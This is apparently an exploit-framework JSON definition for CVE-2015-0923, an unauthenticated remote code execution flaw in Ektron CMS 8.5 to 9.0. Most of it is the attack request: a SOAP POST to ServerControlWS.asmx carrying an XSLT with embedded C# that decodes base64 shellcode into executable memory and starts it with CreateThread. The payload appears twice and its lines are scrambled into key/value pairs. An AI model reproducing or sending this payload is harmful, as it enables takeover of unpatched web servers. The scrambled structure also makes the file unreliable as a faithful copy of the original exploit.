{
   "description" : " Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have\n\nvulnerabilities in various operations within the ServerControlWS.asmx\n\nweb services. These vulnerabilities allow for RCE without authentication and\n\nexecute in the context of IIS on the remote system.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "platform" : "WINDOWS",
   "type" : "MSF",
   "title" : "Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution",
   "variables" : {
      "PATH" : {
         "DESCRIPTION" : "The URI path of the Ektron CMS",
         "VALUE" : "/cms400min/"
      }
   },
   "msf_module" : "ektron_xslt_exec_ws",
   "references" : [
      "http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/"
   ],
   "cve" : "CVE-2015-0923",
   "name" : "EktronXsltExecWs",
   "detection" : {},
   "informations" : {
      "MSF_MODULE" : "ektron_xslt_exec_ws",
      "VARIABLES" : {
         "PATH" : {
            "DESCRIPTION" : "The URI path of the Ektron CMS",
            "VALUE" : "/cms400min/"
         }
      },
      "name" : "EktronXsltExecWs",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "HEADERS" : {
               "Content-Type" : "text/xml; charset=UTF-8",
               "Referer" : "http://127.0.0.1:80/WINDOWS/EKTRON/EktronXsltExecWs/"
            },
            "          xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n" : "          xmlns:user=\"http://mycompany.com/mynamespace\">\n",
            "            private static UInt32 MEM_COMMIT = 0x1000;\n" : "            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n",
            "PAYLOAD" : "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n",
            "TEXT" : "Sending Exploit #1 Request : [POST] /WorkArea/ServerControlWS.asmx",
            "        <xsl:transform version=\"2.0\"\n" : "          xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n",
            "            {\n" : "              string shellcode64 = @&quot;QCeb+Pz8QkL1kpKS+UeXkpP1SENLP5NPQ0lINzdJ/UpOR5hH/D9OP5eTTvyT1khAN9ZP/ZPW+ZKWP0NDL5v4ktZAL0LWkPiSn09G/D9PQT8/m/hBlkdJL0aWSpLWP5+ZSUZLSfiWRkP4SUOflphD9ZeT+ElH1j+SQdaWkkn1T0D5RjeQltZJQEefmz/1J/j5QSebRy8v+JtOSfySJ0lCmZ/89fyb+U83N/w/TtaZl0hPT5kvP0/8R0qS+JZOn5b1kkKSkpBJQfmTlpj49UKQ9fWXlzdCSZKTk5CX9fVLl59K+UYvm0j4kZ9GS5aQ+Ec3n0JASkZDk5CZn0ZKJ0NCSfiRkEtA+Jb5QE+ZmZ+Yn0uQkieWL/lPm0CSn/X51ieRly/4Qk6SkpOfk0n5kvlCn5GZJ5v9kUtBkpE3QUtJk5b5+UtLT9bWT5KWT/VH/fn4SEmR9fWRmZb9RpFIQ0f59Ug/SkCYm5v8N0BBk0P81vz1T/j4SvlDQpaY1pD1SZObn5GQ+ZGbT0lJlpJLJ06fk0KXmSf8mz9AR5DWn0mTmUuZmPz5Q0OX+ZFKS0+Sn5+ZL0En9UL5kEuZQTf4kUE39U74Q5ZBP5aYR9YvQ5P4lz9Kk0/4P05PQ0JCL05GQUufQ5OTSEfWn0OXkvXWkZI3RkGTSZ/5Svz1+T+TSiebmE9IS0iTmUFPkUfWQED81kuQ1pj8Ny+Rl5iW/UI/l5knRvn9SkJOS5eZkjf5n5OQmEtHL5BB/fxAQJb9QUgnky+Qny9O+Tf9TktDkvk/P5I3Ny+f+Deb+ZY//Z/9/ZeTmEP9Ryf4R0qWQ06YSJmW+EtOkpH59ZhBQ0iWL5JH1vlHN5iZQEdK/PVPQjc/kUlBSz+TQD/1N5nWkE/WN58nmUv8+Zj91khBQScn/C+Xm0fWL5tAN9b5QUj4L5+fL5tASEuQTv1LN5BOSPn5SfmR1ptLm5H8QUBANy+YTi+fQpD5+NaWkCf4Qkr4Rpj1/PlHSZ/9P/1HQEgnP/j4kktBSC9DLydDN5Y/L/j8/JNDQ09B+f1L+UtJ/PmZ/fyZ/fxP+Z+XSDf8kZGZTko3N5+R1khCQ5GbQdZLmZb5N/WXS5af9Uj8QUqRn/lLli+WTjdON5JCRktHk0r1+S9Jm5D4T/xBS/1I/EKYRz/4kieSm5L1l5E3mUBDk5hHT0L1TifWkJmY/Pg/ny+bQjebSEE/SidImUtKJz+ZmfWbkPz1QUtBl/lLk0c31v2S9f2QJ0lCl0Inkvz5S5H5T5FJQP1Olkb4lyeYQ0svmS+YP/0/kvxCkJCQkvWRkE+RQpiQkJFCP0uWTpFA+ZJLQ5uXQpmTTjf9mEeWJ/mYlkn1kk83R5iS+UnWkkJC1vyWN0CTmJBCkPhKm5tB/JuSnz+SSEFJTvhOS5MvQ5KW1pGT/dZKP5E/Q5eSSUhKRkhHli+YkNaWP9ZHQEZBN0k3mUFPQ5OX+UqXRjdH+T9IkJ9HkJifQ5EvQ09P/JnWQpuf1k9PSk5KTvVJlpKWTplGn0ORm5/8R0gvmUkvmZJAmUCYL/1PSfxAT5ZHR0cvSZZKR0b8kdY3Qp/5SUn9Nz/8Q9YvQZcnL09OS0EnRpCfTpNIl/yXl9ZDJ5NLmf1A+JiSl0hL+UKSJ9b4J0tI9fz4SZiXmUqZQkfW/ElGP/1CmD+Wl0ibmTdHQJhH+EdDQSdA+EEv/PVCSPn1QDcvQtaRN5nW1ks/+Z+Zl0mZN/XWQEZJJ/z9Qv35m9ZGJ05Gn5DWR5vWn0iTl0P8/U5JL05H+EBASkdLlkb8Q0lIk0D8S5GWSU+fmEZGkZY/mEIn+JBI+U/WT5v9T/lKm/j4SkGTm0FKQUBDSJlD+UCXQD+WQ/WYR0/8/EBA+UovkEj8kZOTkTdB9fmR/JaXkUA/Ri+fL/lPL5ZPR5OZL09KmUfW/JnWkUNDSPn4T0JHkE74QUb5S05LL0r1QJZHS0Cfn/z4SEKSL5mQ/Pz1kE6SQpJPQJmXlvkv9ZlPn0j9kU43kvn49UGZk5NKSvVARjdIQJJG+ZhHSUKfN5Cf/EdHR0n8N9aT+EeTS0pPkC+Ql/yQR06SRp/WT5P4TkdKTzeZlz8/kDf4mZ9DmC9BmPiZlpn4QZ/1T5mZR0eWQ0Kfm/xC/UhASvz19U5DkU5KTkD11kpPT/yT1tZJQkFO+PVARvWR1pCRn0hOT/mfS0hAQklDkEuT+ZaRTzdCkkHWkklPkZtKQkb1n5cvQUE/R/yRkpP5/Eb5RkZG9fz4SEtDk5ZDQkeWSvmX+ZsvRk+ZSZCTk5knSP39lpE/+EhLmJf8lk43J0qXTpeS+UiY+EtGkk5KTz9A9S+WT5ZJ9fVAQ5JKQDdGRz9Lm5jWkJmXL5tLk5/8Ti/9kkdBRkdLJ/hOQi/1mUtBQJNH/U6TlpuTTkuRSp9AkE8/m/WZ+J9P/Z+W+UD9QZJIkkA3SzeXQpJB/JGf1pg3l9YvQZuQkpKRlviWlifW+PyXQpaSSpBG/C9PS5JK9fz4+EOQ9dZCTpgnL/xC9U4nL0o/P5j9Rv2SRk9Ik5eWQJP4QE79+EJPmZtJ9ZtBn0/W/EpIJ5EnTpGQl/n9QSfW+fmb/DcvkZeWlpL91kqRmJCTkkb1P0j5Qz9OkEifN0f8L0b8mU/9lpaR9fmYP0Ynm0pCk5ufly9ATpdPR5EnmydGQZuZn09B1kFARpInTpD5mPmWmNZAgcRU8v//X19QQVlMT0FEX18=&quot;;\n",
            "          <xsl:template match=\"/\">\n" : "            <xsl:value-of select=\"user:xml()\"/>\n",
            "              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n" : "              return &quot;scKkD&quot;;\n",
            "\n" : "            public string xml()\n",
            "              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);\n" : "              IntPtr hThread = IntPtr.Zero;\n",
            "        ]]>\n" : "      </Xslt>\n",
            "          <msxsl:script language=\"C#\" implements-prefix=\"user\">\n" : "\n",
            "            }\n" : "          </msxsl:script>\n",
            "          </xsl:template>\n" : "        </xsl:transform>\n",
            "    <ContentBlockEx xmlns=\"http://www.ektron.com/CMS400/Webservice\">\n" : "      \n",
            "</soap:Envelope>\n" : "\n",
            "            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n" : "\n",
            "              byte[] shellcode = System.Convert.FromBase64String(shellcode64);\n" : "              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "WorkArea/ServerControlWS.asmx",
            "      <Xslt>\n" : "        <![CDATA[\n",
            "            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]\n" : "            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n",
            "              IntPtr pinfo = IntPtr.Zero;\n" : "              UInt32 threadId = 0;\n",
            "METHOD" : "POST",
            "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" : "  <soap:Body>\n",
            "    </ContentBlockEx>\n" : "  </soap:Body>\n"
         }
      },
      "DESCRIPTION" : " Ektron 8.5, 8.7 <= sp1, 9.0 < sp1 have\n\nvulnerabilities in various operations within the ServerControlWS.asmx\n\nweb services. These vulnerabilities allow for RCE without authentication and\n\nexecute in the context of IIS on the remote system.\n\n      ",
      "TITLE" : "Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution",
      "CVE" : "CVE-2015-0923",
      "PLATFORM" : "WINDOWS",
      "TYPE" : "MSF",
      "REFERENCES" : [
         "http://www.websecuritywatch.com/xxe-arbitrary-code-execution-in-ektron-cms/"
      ],
      "PATHS" : [
         "cms400min/"
      ]
   },
   "paths" : [
      "cms400min/"
   ],
   "requests" : {
      "EXPLOIT1" : {
         "HEADERS" : {
            "Content-Type" : "text/xml; charset=UTF-8",
            "Referer" : "http://127.0.0.1:80/WINDOWS/EKTRON/EktronXsltExecWs/"
         },
         "          xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"\n" : "          xmlns:user=\"http://mycompany.com/mynamespace\">\n",
         "            private static UInt32 MEM_COMMIT = 0x1000;\n" : "            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n",
         "PAYLOAD" : "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n",
         "TEXT" : "Sending Exploit #1 Request : [POST] /WorkArea/ServerControlWS.asmx",
         "        <xsl:transform version=\"2.0\"\n" : "          xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n",
         "            {\n" : "              string shellcode64 = @&quot;QCeb+Pz8QkL1kpKS+UeXkpP1SENLP5NPQ0lINzdJ/UpOR5hH/D9OP5eTTvyT1khAN9ZP/ZPW+ZKWP0NDL5v4ktZAL0LWkPiSn09G/D9PQT8/m/hBlkdJL0aWSpLWP5+ZSUZLSfiWRkP4SUOflphD9ZeT+ElH1j+SQdaWkkn1T0D5RjeQltZJQEefmz/1J/j5QSebRy8v+JtOSfySJ0lCmZ/89fyb+U83N/w/TtaZl0hPT5kvP0/8R0qS+JZOn5b1kkKSkpBJQfmTlpj49UKQ9fWXlzdCSZKTk5CX9fVLl59K+UYvm0j4kZ9GS5aQ+Ec3n0JASkZDk5CZn0ZKJ0NCSfiRkEtA+Jb5QE+ZmZ+Yn0uQkieWL/lPm0CSn/X51ieRly/4Qk6SkpOfk0n5kvlCn5GZJ5v9kUtBkpE3QUtJk5b5+UtLT9bWT5KWT/VH/fn4SEmR9fWRmZb9RpFIQ0f59Ug/SkCYm5v8N0BBk0P81vz1T/j4SvlDQpaY1pD1SZObn5GQ+ZGbT0lJlpJLJ06fk0KXmSf8mz9AR5DWn0mTmUuZmPz5Q0OX+ZFKS0+Sn5+ZL0En9UL5kEuZQTf4kUE39U74Q5ZBP5aYR9YvQ5P4lz9Kk0/4P05PQ0JCL05GQUufQ5OTSEfWn0OXkvXWkZI3RkGTSZ/5Svz1+T+TSiebmE9IS0iTmUFPkUfWQED81kuQ1pj8Ny+Rl5iW/UI/l5knRvn9SkJOS5eZkjf5n5OQmEtHL5BB/fxAQJb9QUgnky+Qny9O+Tf9TktDkvk/P5I3Ny+f+Deb+ZY//Z/9/ZeTmEP9Ryf4R0qWQ06YSJmW+EtOkpH59ZhBQ0iWL5JH1vlHN5iZQEdK/PVPQjc/kUlBSz+TQD/1N5nWkE/WN58nmUv8+Zj91khBQScn/C+Xm0fWL5tAN9b5QUj4L5+fL5tASEuQTv1LN5BOSPn5SfmR1ptLm5H8QUBANy+YTi+fQpD5+NaWkCf4Qkr4Rpj1/PlHSZ/9P/1HQEgnP/j4kktBSC9DLydDN5Y/L/j8/JNDQ09B+f1L+UtJ/PmZ/fyZ/fxP+Z+XSDf8kZGZTko3N5+R1khCQ5GbQdZLmZb5N/WXS5af9Uj8QUqRn/lLli+WTjdON5JCRktHk0r1+S9Jm5D4T/xBS/1I/EKYRz/4kieSm5L1l5E3mUBDk5hHT0L1TifWkJmY/Pg/ny+bQjebSEE/SidImUtKJz+ZmfWbkPz1QUtBl/lLk0c31v2S9f2QJ0lCl0Inkvz5S5H5T5FJQP1Olkb4lyeYQ0svmS+YP/0/kvxCkJCQkvWRkE+RQpiQkJFCP0uWTpFA+ZJLQ5uXQpmTTjf9mEeWJ/mYlkn1kk83R5iS+UnWkkJC1vyWN0CTmJBCkPhKm5tB/JuSnz+SSEFJTvhOS5MvQ5KW1pGT/dZKP5E/Q5eSSUhKRkhHli+YkNaWP9ZHQEZBN0k3mUFPQ5OX+UqXRjdH+T9IkJ9HkJifQ5EvQ09P/JnWQpuf1k9PSk5KTvVJlpKWTplGn0ORm5/8R0gvmUkvmZJAmUCYL/1PSfxAT5ZHR0cvSZZKR0b8kdY3Qp/5SUn9Nz/8Q9YvQZcnL09OS0EnRpCfTpNIl/yXl9ZDJ5NLmf1A+JiSl0hL+UKSJ9b4J0tI9fz4SZiXmUqZQkfW/ElGP/1CmD+Wl0ibmTdHQJhH+EdDQSdA+EEv/PVCSPn1QDcvQtaRN5nW1ks/+Z+Zl0mZN/XWQEZJJ/z9Qv35m9ZGJ05Gn5DWR5vWn0iTl0P8/U5JL05H+EBASkdLlkb8Q0lIk0D8S5GWSU+fmEZGkZY/mEIn+JBI+U/WT5v9T/lKm/j4SkGTm0FKQUBDSJlD+UCXQD+WQ/WYR0/8/EBA+UovkEj8kZOTkTdB9fmR/JaXkUA/Ri+fL/lPL5ZPR5OZL09KmUfW/JnWkUNDSPn4T0JHkE74QUb5S05LL0r1QJZHS0Cfn/z4SEKSL5mQ/Pz1kE6SQpJPQJmXlvkv9ZlPn0j9kU43kvn49UGZk5NKSvVARjdIQJJG+ZhHSUKfN5Cf/EdHR0n8N9aT+EeTS0pPkC+Ql/yQR06SRp/WT5P4TkdKTzeZlz8/kDf4mZ9DmC9BmPiZlpn4QZ/1T5mZR0eWQ0Kfm/xC/UhASvz19U5DkU5KTkD11kpPT/yT1tZJQkFO+PVARvWR1pCRn0hOT/mfS0hAQklDkEuT+ZaRTzdCkkHWkklPkZtKQkb1n5cvQUE/R/yRkpP5/Eb5RkZG9fz4SEtDk5ZDQkeWSvmX+ZsvRk+ZSZCTk5knSP39lpE/+EhLmJf8lk43J0qXTpeS+UiY+EtGkk5KTz9A9S+WT5ZJ9fVAQ5JKQDdGRz9Lm5jWkJmXL5tLk5/8Ti/9kkdBRkdLJ/hOQi/1mUtBQJNH/U6TlpuTTkuRSp9AkE8/m/WZ+J9P/Z+W+UD9QZJIkkA3SzeXQpJB/JGf1pg3l9YvQZuQkpKRlviWlifW+PyXQpaSSpBG/C9PS5JK9fz4+EOQ9dZCTpgnL/xC9U4nL0o/P5j9Rv2SRk9Ik5eWQJP4QE79+EJPmZtJ9ZtBn0/W/EpIJ5EnTpGQl/n9QSfW+fmb/DcvkZeWlpL91kqRmJCTkkb1P0j5Qz9OkEifN0f8L0b8mU/9lpaR9fmYP0Ynm0pCk5ufly9ATpdPR5EnmydGQZuZn09B1kFARpInTpD5mPmWmNZAgcRU8v//X19QQVlMT0FEX18=&quot;;\n",
         "          <xsl:template match=\"/\">\n" : "            <xsl:value-of select=\"user:xml()\"/>\n",
         "              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n" : "              return &quot;scKkD&quot;;\n",
         "\n" : "            public string xml()\n",
         "              System.Runtime.InteropServices.Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);\n" : "              IntPtr hThread = IntPtr.Zero;\n",
         "        ]]>\n" : "      </Xslt>\n",
         "          <msxsl:script language=\"C#\" implements-prefix=\"user\">\n" : "\n",
         "            }\n" : "          </msxsl:script>\n",
         "          </xsl:template>\n" : "        </xsl:transform>\n",
         "    <ContentBlockEx xmlns=\"http://www.ektron.com/CMS400/Webservice\">\n" : "      \n",
         "</soap:Envelope>\n" : "\n",
         "            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n" : "\n",
         "              byte[] shellcode = System.Convert.FromBase64String(shellcode64);\n" : "              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "WorkArea/ServerControlWS.asmx",
         "      <Xslt>\n" : "        <![CDATA[\n",
         "            [System.Runtime.InteropServices.DllImport(&quot;kernel32&quot;)]\n" : "            private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n",
         "              IntPtr pinfo = IntPtr.Zero;\n" : "              UInt32 threadId = 0;\n",
         "METHOD" : "POST",
         "<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n" : "  <soap:Body>\n",
         "    </ContentBlockEx>\n" : "  </soap:Body>\n"
      }
   }
}
